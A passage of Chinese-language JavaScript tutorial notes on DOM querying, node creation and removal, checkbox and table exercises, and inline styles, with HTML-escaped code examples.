&lt;style&gt; * &#123; margin: 0; padding: 0; &#125; .container &#123; width: 500px; margin: 50px auto; text-align: center; background-color: rgb(122, 161, 240); padding: 10px; &#125; img &#123; width: 100%; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; /* 点击按钮切换图片 */ var imgArr = [&quot;./img/1.png&quot;, &quot;./img/2.png&quot;, &quot;./img/3.png&quot;, &quot;./img/4.png&quot;], index = 0; // 获取按钮 var prev = document.getElementById(&quot;prev&quot;); var next = document.getElementById(&quot;next&quot;); /* 要切换图片就是要修改img标签的src属性 要修改一个元素的属性：元素.属性 = 属性值 */ // 取出img标签 var img = document.getElementsByTagName(&quot;img&quot;)[0]; prev.onclick = function () &#123; img.src = imgArr[(index - 1 &lt; 0) ? (index = imgArr.length - 1) : (--index)]; &#125; next.onclick = function () &#123; img.src = imgArr[(index + 1 == imgArr.length) ? (index = 0) : (++index)]; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;img src=&quot;./img/1.png&quot; alt=&quot;1&quot;&gt; &lt;button id=&quot;prev&quot;&gt;上一张&lt;/button&gt; &lt;button id=&quot;next&quot;&gt;下一张&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 096-097 DOM查询 getElementById innerHTML innerText getElementsByTagName：可以根据标签名来获取一组元素节点对象 getElementsByName：根据name属性获取一组元素节点对象 childNodes：属性会获取包括文本节点在内的所有节点 children：属性可以获取当前元素的所有子元素 firstChild：firstChild可以获取到当前元素的第一个子节点（包括空白文本节点） firstElementChild：获取当前元素的第一个子元素 parentNode：父节点 previousSibling nextSibling nextElementSibling：previousElementSibling获取前一个兄弟元素，IE8及以下不支持 nodeValue：获取文本节点的文本内容lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;DOM查询&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/css.css&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; /* * 定义一个函数，专门用来为指定元素绑定单击响应函数 * 参数： * idStr 要绑定单击响应函数的对象的id属性值 * fun 事件的回调函数，当单击元素时，该函数将会被触发 */ function myClick(idStr, fun) &#123; var btn = document.getElementById(idStr); btn.onclick = fun; &#125; window.onload = function () &#123; //为id为btn01的按钮绑定一个单击响应函数 var btn01 = document.getElementById(&quot;btn01&quot;); btn01.onclick = function () &#123; //查找#bj节点 var bj = document.getElementById(&quot;bj&quot;); //打印bj //innerHTML 通过这个属性可以获取到元素内部的html代码 alert(bj.innerHTML); &#125;; //为id为btn02的按钮绑定一个单击响应函数 var btn02 = document.getElementById(&quot;btn02&quot;); btn02.onclick = function () &#123; //查找所有li节点 //getElementsByTagName()可以根据标签名来获取一组元素节点对象 //这个方法会给我们返回一个类数组对象，所有查询到的元素都会封装到对象中 //即使查询到的元素只有一个，也会封装到数组中返回 var lis = document.getElementsByTagName(&quot;li&quot;); //打印lis //alert(lis.length); //变量lis for (var i = 0; i &lt; lis.length; i++) &#123; alert(lis[i].innerHTML); &#125; &#125;; //为id为btn03的按钮绑定一个单击响应函数 var btn03 = document.getElementById(&quot;btn03&quot;); btn03.onclick = function () &#123; //查找name=gender的所有节点 var inputs = document.getElementsByName(&quot;gender&quot;); //alert(inputs.length); for (var i = 0; i &lt; inputs.length; i++) &#123; /* * innerHTML用于获取元素内部的HTML代码的 * 对于自结束标签，这个属性没有意义 */ //alert(inputs[i].innerHTML); /* * 如果需要读取元素节点属性， * 直接使用 元素.属性名 * 例子：元素.id 元素.name 元素.value * 注意：class属性不能采用这种方式， * 读取class属性时需要使用 元素.className */ alert(inputs[i].className); &#125; &#125;; //为id为btn04的按钮绑定一个单击响应函数 var btn04 = document.getElementById(&quot;btn04&quot;); btn04.onclick = function () &#123; //获取id为city的元素 var city = document.getElementById(&quot;city&quot;); //查找#city下所有li节点 var lis = city.getElementsByTagName(&quot;li&quot;); for (var i = 0; i &lt; lis.length; i++) &#123; alert(lis[i].innerHTML); &#125; &#125;; //为id为btn05的按钮绑定一个单击响应函数 var btn05 = document.getElementById(&quot;btn05&quot;); btn05.onclick = function () &#123; //获取id为city的节点 var city = document.getElementById(&quot;city&quot;); //返回#city的所有子节点 /* * childNodes属性会获取包括文本节点在内的所有节点 * 根据DOM标签标签间空白也会当成文本节点 * 注意：在IE8及以下的浏览器中，不会将空白文本当成子节点， * 所以该属性在IE8中会返回4个子元素而其他浏览器是9个 */ var cns = city.childNodes; //alert(cns.length); /*for(var i=0 ; i&lt;cns.length ; i++)&#123; alert(cns[i]); &#125;*/ /* * children属性可以获取当前元素的所有子元素 */ var cns2 = city.children; alert(cns2.length); //4 &#125;; //为id为btn06的按钮绑定一个单击响应函数 var btn06 = document.getElementById(&quot;btn06&quot;); btn06.onclick = function () &#123; //获取id为phone的元素 var phone = document.getElementById(&quot;phone&quot;); //返回#phone的第一个子节点 //phone.childNodes[0]; //firstChild可以获取到当前元素的第一个子节点（包括空白文本节点） // 子节点包括文本节点，子元素不包括文本节点 var fir = phone.firstChild; //firstElementChild获取当前元素的第一个子元素 /* * firstElementChild不支持IE8及以下的浏览器， * 如果需要兼容他们尽量不要使用 */ //fir = phone.firstElementChild; alert(fir); &#125;; //为id为btn07的按钮绑定一个单击响应函数 myClick(&quot;btn07&quot;, function () &#123; //获取id为bj的节点 var bj = document.getElementById(&quot;bj&quot;); //返回#bj的父节点，一定是元素节点，不可能是文本节点；而且只有唯一一个返回元素节点 var pn = bj.parentNode; alert(pn.innerHTML); /* * innerText * - 该属性可以获取到元素内部的文本内容 * - 它和innerHTML类似，不同的是它会自动将html去除 */ //alert(pn.innerText); &#125;); //为id为btn08的按钮绑定一个单击响应函数 myClick(&quot;btn08&quot;, function () &#123; //获取id为android的元素 var and = document.getElementById(&quot;android&quot;); //返回#android的前一个兄弟节点（也可能获取到空白的文本） var ps = and.previousSibling; //previousElementSibling获取前一个兄弟元素，IE8及以下不支持 //var pe = and.previousElementSibling; alert(ps); &#125;); //读取#username的value属性值 myClick(&quot;btn09&quot;, function () &#123; //获取id为username的元素 var um = document.getElementById(&quot;username&quot;); //读取um的value属性值 //文本框的value属性值，就是文本框中填写的内容 alert(um.value); &#125;); //设置#username的value属性值 myClick(&quot;btn10&quot;, function () &#123; //获取id为username的元素 var um = document.getElementById(&quot;username&quot;); um.value = &quot;今天天气真不错~~~&quot;; &#125;); //返回#bj的文本值 myClick(&quot;btn11&quot;, function () &#123; //获取id为bj的元素 var bj = document.getElementById(&quot;bj&quot;); //alert(bj.innerHTML); //alert(bj.innerText); //获取bj中的文本节点 /*var fc = bj.firstChild; alert(fc.nodeValue);*/ alert(bj.firstChild.nodeValue); &#125;); &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;total&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;p&gt; 你喜欢哪个城市? &lt;/p&gt; &lt;ul id=&quot;city&quot;&gt; &lt;li id=&quot;bj&quot;&gt;北京&lt;/li&gt; &lt;li&gt;上海&lt;/li&gt; &lt;li&gt;东京&lt;/li&gt; &lt;li&gt;首尔&lt;/li&gt; &lt;/ul&gt; &lt;br&gt; &lt;br&gt; &lt;p&gt; 你喜欢哪款单机游戏? &lt;/p&gt; &lt;ul id=&quot;game&quot;&gt; &lt;li id=&quot;rl&quot;&gt;红警&lt;/li&gt; &lt;li&gt;实况&lt;/li&gt; &lt;li&gt;极品飞车&lt;/li&gt; &lt;li&gt;魔兽&lt;/li&gt; &lt;/ul&gt; &lt;br /&gt; &lt;br /&gt; &lt;p&gt; 你手机的操作系统是? &lt;/p&gt; &lt;ul id=&quot;phone&quot;&gt; &lt;li&gt;IOS&lt;/li&gt; &lt;li id=&quot;android&quot;&gt;Android&lt;/li&gt; &lt;li&gt;Windows Phone&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;inner&quot;&gt; gender: &lt;input class=&quot;hello&quot; type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;male&quot; /&gt; Male &lt;input class=&quot;hello&quot; type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;female&quot; /&gt; Female &lt;br&gt; &lt;br&gt; name: &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;username&quot; value=&quot;abcde&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;btnList&quot;&gt; &lt;div&gt;&lt;button id=&quot;btn01&quot;&gt;查找#bj节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn02&quot;&gt;查找所有li节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn03&quot;&gt;查找name=gender的所有节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn04&quot;&gt;查找#city下所有li节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn05&quot;&gt;返回#city的所有子节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn06&quot;&gt;返回#phone的第一个子节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn07&quot;&gt;返回#bj的父节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn08&quot;&gt;返回#android的前一个兄弟节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn09&quot;&gt;返回#username的value属性值&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn10&quot;&gt;设置#username的value属性值&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn11&quot;&gt;返回#bj的文本值&lt;/button&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 098 - 100 全选练习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;全选练习&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; /* 全选按钮： - 点击按钮后，四个多选框全都被选中 */ //1.#checkedAllBtn // 为id为checkedAllBtn的按钮绑定一个单击响应函数 var checkedAllBox = document.getElementById(&quot;checkedAllBox&quot;); var checkAllBtn = document.getElementById(&quot;checkedAllBtn&quot;); checkedAllBtn.onclick = function () &#123; // 获取四个多选框items var items = document.getElementsByName(&quot;items&quot;); // alert(items.length); // 遍历items for (var i = 0; i &lt; items.length; i++) &#123; // 设置四个多选框1变为选中状态 // 通过多选框的checked属性可以来获取或设置多选框的选中状态 items[i].checked = true; &#125; checkedAllBox.checked = true; &#125; //2.#checkedNoBtn var checkedNoBtn = document.getElementById(&quot;checkedNoBtn&quot;); checkedNoBtn.onclick = function () &#123; var items = document.getElementsByName(&quot;items&quot;); for (var i = 0; i &lt; items.length; i++) &#123; items[i].checked = false; &#125; checkedAllBox.checked = false; &#125; //3.#checkedRevBtn var checkedRevBtn = document.getElementById(&quot;checkedRevBtn&quot;); checkedRevBtn.onclick = function () &#123; var items = document.getElementsByName(&quot;items&quot;); for (var i = 0; i &lt; items.length; i++) &#123; items[i].checked = items[i].checked ? false : true; &#125; &#125; //4.#sendBtn var sendBtn = document.getElementById(&quot;sendBtn&quot;); sendBtn.onclick = function () &#123; var items = document.getElementsByName(&quot;items&quot;); for (var i = 0; i &lt; items.length; i++) &#123; if (items[i]) &#123; alert(items[i].value); &#125; &#125; &#125; //5.#checkedAllBox /* 全选/全不选 - 当它选中时，其余的也选中；当它取消时，其余的也取消 在事件的响应函数中，响应函数是给谁绑定的，this就是谁 */ checkedAllBox.onclick = function () &#123; // 设置多选框的选中状态 var items = document.getElementsByName(&quot;items&quot;); for (var i = 0; i &lt; items.length; i++) &#123; items[i].checked = checkedAllBox.checked; &#125; console.log(this === checkedAllBox); // true &#125;; //6.items // 如果四个多选框都选中，则checkedAllBox也应该选中；如果四个多选框都没选中，则checkedAllBox也不应该选中 var items = document.getElementsByName(&quot;items&quot;); for (var i = 0; i &lt; items.length; i++) &#123; items[i].onclick = function () &#123; checkedAllBox.checked = true; for (var j = 0; j &lt; items.length; j++) &#123; // 判断四个多选框是否全选 // 只要有一个未选中就不是全选 if (!items[j].checked) &#123; // 一旦进入判断，则证明不是全选状态，将checkedAllBox设置为未选中状态 checkedAllBox.checked = false; break; &#125; &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;&quot;&gt; 你爱好的运动是？&lt;input type=&quot;checkbox&quot; id=&quot;checkedAllBox&quot; /&gt;全选/全不选 &lt;br /&gt; &lt;input type=&quot;checkbox&quot; name=&quot;items&quot; value=&quot;足球&quot; /&gt;足球 &lt;input type=&quot;checkbox&quot; name=&quot;items&quot; value=&quot;篮球&quot; /&gt;篮球 &lt;input type=&quot;checkbox&quot; name=&quot;items&quot; value=&quot;羽毛球&quot; /&gt;羽毛球 &lt;input type=&quot;checkbox&quot; name=&quot;items&quot; value=&quot;乒乓球&quot; /&gt;乒乓球 &lt;br /&gt; &lt;input type=&quot;button&quot; id=&quot;checkedAllBtn&quot; value=&quot;全 选&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;checkedNoBtn&quot; value=&quot;全不选&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;checkedRevBtn&quot; value=&quot;反 选&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;sendBtn&quot; value=&quot;提 交&quot; /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 101 DOM查询的剩余方法document.all 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;DOM查询剩余方法&lt;/title&gt; &lt;script&gt; /* */ window.onload = function () &#123; // 获取body标签 var body1 = document.getElementsByTagName(&quot;body&quot;)[0]; console.log(body1); /* 在document中有一个属性body，它保存的是body的引用 */ var body2 = document.body; console.log(body1 === body2); // true /* body.documentElement保存的是html的根标签 */ var html = document.documentElement; console.log(html); /* document.all代表页面中的所有元素，但是目前已废弃 */ var all1 = document.all; console.log(all1, all1.length); // HTMLAllCollection(8) 8 var all2 = document.getElementsByTagName(&quot;*&quot;);// 和document.all差不多，都是代表页面中的所有元素，可以使用它代替all的效果 /* 根据元素的class属性值查询一组元素节点对象 getElementsByClassName()可以根据class属性值获取一组元素节点对象，但是该方法不支持IE8及其以下版本浏览器 */ var box1 = document.getElementsByClassName(&quot;mk&quot;); console.log(box1.length); // 3 /* querySelector() - 需要一个选择器的字符串作为参数，可以根据一个CSS选择器!!!来查询一个元素节点对象 - 虽然IE8中没有getElementsByClassName()但是可以使用querySelector()代替 - 注意：使用该方法总会返回唯一的一个元素，如果有多个元素满足条件，则只会返回第一个满足的对象 */ var s_div = document.querySelector(&quot;.ycy&quot;); console.log(s_div); /* document.querySelectorAll()该方法和querySelector()用法相似，不同的是它会将符合条件的元素封装为一个数组，即使返回的数组只有一个元素 */ var mk_div = document.querySelectorAll(&quot;.mk&quot;); console.log(mk_div.length); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;mk ycy&quot;&gt; &lt;div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;mk&quot;&gt;&lt;/div&gt; &lt;div class=&quot;mk&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 102 DOM增删改123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;DOM增删改&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/css.css&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; //创建一个&quot;广州&quot;节点,添加到#city下 myClick(&quot;btn01&quot;, function () &#123; //创建广州节点 &lt;li&gt;广州&lt;/li&gt; //创建li元素节点 /* * document.createElement() * 可以用于创建一个元素节点对象， * 它需要一个标签名作为参数，将会根据该标签名创建元素节点对象， * 并将创建好的对象作为返回值返回 */ var li = document.createElement(&quot;li&quot;); //创建广州文本节点 /* * document.createTextNode() * 可以用来创建一个文本节点对象 * 需要一个文本内容作为参数，将会根据该内容创建文本节点，并将新的节点返回 */ var gzText = document.createTextNode(&quot;广州&quot;); //将gzText设置li的子节点 /* * appendChild() * - 向一个父节点中添加一个新的子节点 * - 用法：父节点.appendChild(子节点); */ li.appendChild(gzText); //获取id为city的节点 var city = document.getElementById(&quot;city&quot;); //将广州添加到city下 city.appendChild(li); &#125;); //将&quot;广州&quot;节点插入到#bj前面 myClick(&quot;btn02&quot;, function () &#123; //创建一个广州 var li = document.createElement(&quot;li&quot;); var gzText = document.createTextNode(&quot;广州&quot;); li.appendChild(gzText); //获取id为bj的节点 var bj = document.getElementById(&quot;bj&quot;); //获取city var city = document.getElementById(&quot;city&quot;); /* * insertBefore() * - 可以在指定的子节点前插入新的子节点 * - 语法： * 父节点.insertBefore(新节点,旧节点); */ city.insertBefore(li, bj); &#125;); //使用&quot;广州&quot;节点替换#bj节点 myClick(&quot;btn03&quot;, function () &#123; //创建一个广州 var li = document.createElement(&quot;li&quot;); var gzText = document.createTextNode(&quot;广州&quot;); li.appendChild(gzText); //获取id为bj的节点 var bj = document.getElementById(&quot;bj&quot;); //获取city var city = document.getElementById(&quot;city&quot;); /* * replaceChild() * - 可以使用指定的子节点替换已有的子节点 * - 语法：父节点.replaceChild(新节点,旧节点); */ city.replaceChild(li, bj); &#125;); //删除#bj节点 myClick(&quot;btn04&quot;, function () &#123; //获取id为bj的节点 var bj = document.getElementById(&quot;bj&quot;); //获取city var city = document.getElementById(&quot;city&quot;); /* * removeChild() * - 可以删除一个子节点 * - 语法：父节点.removeChild(子节点); * * 子节点.parentNode.removeChild(子节点); */ //city.removeChild(bj); bj.parentNode.removeChild(bj); &#125;); //读取#city内的HTML代码 myClick(&quot;btn05&quot;, function () &#123; //获取city var city = document.getElementById(&quot;city&quot;); alert(city.innerHTML); &#125;); //设置#bj内的HTML代码 myClick(&quot;btn06&quot;, function () &#123; //获取bj var bj = document.getElementById(&quot;bj&quot;); bj.innerHTML = &quot;昌平&quot;; &#125;); myClick(&quot;btn07&quot;, function () &#123; /* createElement()创建元素节点，使用innerHTML添加文本节点，然后appendChild() */ //向city中添加广州 var city = document.getElementById(&quot;city&quot;); /* * 使用innerHTML也可以完成DOM的增删改的相关操作 * 一般我们会两种方式结合使用 */ //city.innerHTML += &quot;&lt;li&gt;广州&lt;/li&gt;&quot;; //创建一个li var li = document.createElement(&quot;li&quot;); //向li中设置文本 li.innerHTML = &quot;广州&quot;; //将li添加到city中 city.appendChild(li); &#125;); &#125;; function myClick(idStr, fun) &#123; var btn = document.getElementById(idStr); btn.onclick = fun; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;total&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;p&gt; 你喜欢哪个城市? &lt;/p&gt; &lt;ul id=&quot;city&quot;&gt; &lt;li id=&quot;bj&quot;&gt;北京&lt;/li&gt; &lt;li&gt;上海&lt;/li&gt; &lt;li&gt;东京&lt;/li&gt; &lt;li&gt;首尔&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;btnList&quot;&gt; &lt;div&gt;&lt;button id=&quot;btn01&quot;&gt;创建一个&quot;广州&quot;节点,添加到#city下&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn02&quot;&gt;将&quot;广州&quot;节点插入到#bj前面&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn03&quot;&gt;使用&quot;广州&quot;节点替换#bj节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn04&quot;&gt;删除#bj节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn05&quot;&gt;读取#city内的HTML代码&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn06&quot;&gt;设置#bj内的HTML代码&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn07&quot;&gt;创建一个&quot;广州&quot;节点,添加到#city下&lt;/button&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; document.createElement document.createTextNode appendChild： ​ 父节点.appendChild(节点); insertBefore： ​ 父节点.insertBefore(新节点,旧节点); ​ 旧节点.parentNode.insertBefore(新节点,旧节点); replaceChild： ​ 父节点.replaceChild(新节点,旧节点); ​ 旧节点.parentNode.replaceChild(新节点,旧节点); removeChild： ​ 子节点.parentNode.removeChild(子节点); ​ 父节点.removeChild(子节点); 103-106 添加删除记录123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;添加删除记录练习&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/1.css&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; /* 点击超链接删除一个员工信息 */ // 获取所有超链接 var allA = document.getElementsByTagName(&quot;a&quot;); // 为每个超链接都绑定一个单击响应函数 for (var i = 0; i &lt; allA.length; i++) &#123; allA[i].onclick = function () &#123; /* 点击超链接之后需要删除超链接所在行 注意：在事件的响应函数中，响应函数是给谁绑定的，this就是谁 */ /* 点击超链接会跳转页面，这是超链接的默认行为，但是此时不希望出现默认行为，可以通过return false来取消默认行为。 或者可以使用：&lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt;来取消默认行为 */ // 删除之前弹出提示框 /* confirm用于弹出一个带有确认和取消按钮的提示框，需要字符串作为参数，该参数将会作为提示文字显示出来 用户点击确认返回true，如果点击取消返回false */ var parentTr = this.parentNode.parentNode; if (confirm(&quot;确认删除&quot; + parentTr.getElementsByTagName(&quot;td&quot;)[0].innerHTML + &quot;吗？&quot;)) &#123; // 获取当前tr parentTr.parentNode.removeChild(parentTr); &#125; return false; &#125; &#125; /* 添加员工信息功能 - 点击按钮后，将员工的信息添加到表格中 */ // 为提交按钮以后，将员工的信息添加到表格中 var addEmpButton = document.getElementById(&quot;addEmpButton&quot;); addEmpButton.onclick = function () &#123; // 获取表单内容 var name = document.getElementById(&quot;empName&quot;).value; var email = document.getElementById(&quot;email&quot;).value; var salary = document.getElementById(&quot;salary&quot;).value; var tableList = document.getElementById(&quot;employeeTable&quot;); /* &lt;tr&gt; &lt;td&gt;Tom&lt;/td&gt; &lt;td&gt;tom@.com&lt;/td&gt; &lt;td&gt;5000&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;deleteEmp?id=001&quot;&gt;Delete&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; 需要将获取到的信息保存到tr中 向a标签中添加href属性：a.href = 属性值 */ var tr = document.createElement(&quot;tr&quot;); var td1 = document.createElement(&quot;td&quot;); td1.innerHTML = name; var td2 = document.createElement(&quot;td&quot;); td2.innerHTML = email; var td3 = document.createElement(&quot;td&quot;); td3.innerHTML = salary; var td4 = document.createElement(&quot;td&quot;); td4.innerHTML = `&lt;a href=&quot;deleteEmp?id=001&quot;&gt;Delete&lt;/a&gt;`; tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3); tr.appendChild(td4); tableList.children[0].appendChild(tr); // 为新信息添加点击事件 td4.children[0].onclick = function () &#123; var parentTr = this.parentNode.parentNode; if (confirm(&quot;确认删除&quot; + parentTr.getElementsByTagName(&quot;td&quot;)[0].innerHTML + &quot;吗？&quot;)) &#123; parentTr.parentNode.removeChild(parentTr); &#125; return false; &#125; &#125; &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;table id=&quot;employeeTable&quot;&gt; &lt;tr&gt; &lt;th&gt;Name&lt;/th&gt; &lt;th&gt;Email&lt;/th&gt; &lt;th&gt;Salary&lt;/th&gt; &lt;th&gt;&amp;nbsp;&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Tom&lt;/td&gt; &lt;td&gt;tom@.com&lt;/td&gt; &lt;td&gt;5000&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;deleteEmp?id=001&quot;&gt;Delete&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Jerry&lt;/td&gt; &lt;td&gt;jerry@sohu.com&lt;/td&gt; &lt;td&gt;8000&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;deleteEmp?id=002&quot;&gt;Delete&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Bob&lt;/td&gt; &lt;td&gt;bob@tom.com&lt;/td&gt; &lt;td&gt;10000&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;deleteEmp?id=003&quot;&gt;Delete&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div id=&quot;formDiv&quot;&gt; &lt;h4&gt;添加新员工&lt;/h4&gt; &lt;table&gt; &lt;tr&gt; &lt;td class=&quot;word&quot;&gt;name: &lt;/td&gt; &lt;td class=&quot;inp&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;empName&quot; id=&quot;empName&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;word&quot;&gt;email: &lt;/td&gt; &lt;td class=&quot;inp&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; id=&quot;email&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;word&quot;&gt;salary: &lt;/td&gt; &lt;td class=&quot;inp&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;salary&quot; id=&quot;salary&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt; &lt;!-- 不会有提交表单的功能，因为没有form表单，所以不需要取消默认行为 --&gt; &lt;button id=&quot;addEmpButton&quot;&gt; Submit &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 浏览器生成了tbody包裹了tr，所以需要往tbody中添加 106 a的索引问题在上面练习中事件回调函数中，不使用this，而是使用allA[i]，会报错，因为allA[i]是undefined，这是i的问题。 123456789for (var i = 0; i &lt; allA.length; i++) &#123; allA[i].onclick = function () &#123; /* for循环会在页面加载完成后立即执行，而响应函数在超链接被点击时执行，所以当响应函数执行时，for循环早就执行完成了，当for循环执行时，i = 3，以3为索引的值为undefined */ alert(allA[i]); return false; &#125; &#125; 107 操作内联样式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;操作内联样式&lt;/title&gt; &lt;style&gt; #box1 &#123; width: 100px; height: 100px; background-color: #8080ff; &#125; &lt;/style&gt; &lt;script&gt; window.onload = function () &#123; // 为单击按钮绑定响应函数 var btn01 = document.getElementsByTagName(&quot;button&quot;)[0]; var btn02 = document.getElementsByTagName(&quot;button&quot;)[1]; var box1 = document.getElementById(&quot;box1&quot;); btn01.onclick = function () &#123; // 修改box1的高度 /* 通过JS修改元素的样式 语法：元素.style.样式名 = 样式值; 注意：如果CSS的样式名中含有-，这种名称在JS中是不合法的，比如：background-color 需要将这种样式修改为驼峰命名法 去掉-，然后将-后面的字母大写 backgroundColor borderTopWidth 我们通过style属性设置的样式都是内联样式，而内联样式有较高的优先级，所以通过JS修改的样式往往会立即显示 